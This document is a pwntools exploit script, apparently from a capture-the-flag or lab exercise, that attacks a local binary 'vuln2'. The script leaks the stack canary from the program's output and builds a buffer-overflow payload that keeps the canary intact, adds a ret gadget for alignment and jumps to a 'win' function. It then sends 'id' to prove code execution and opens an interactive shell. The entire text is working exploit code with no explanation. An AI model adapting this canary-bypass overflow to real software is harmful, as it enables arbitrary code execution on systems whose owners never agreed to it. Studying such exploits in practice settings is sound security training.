from pwn import *

elf = ELF('./vuln2', checksec=False)
p = process('./vuln2')

leak = p.recv(80)
canary = leak[72:80]
log.info(f"canary: {canary.hex()}")
assert canary[0] == 0x00

ret_gadget = 0x401016   # <-- replace with YOUR objdump result

payload  = b'A' * 72
payload += canary
payload += b'B' * 8
payload += p64(ret_gadget)       # alignment fixer — new line
payload += p64(elf.sym['win'])

p.sendline(b'200')
p.sendline(payload)

p.sendline(b'id')                # prove code exec, don't rely on reading prompt text
p.interactive()
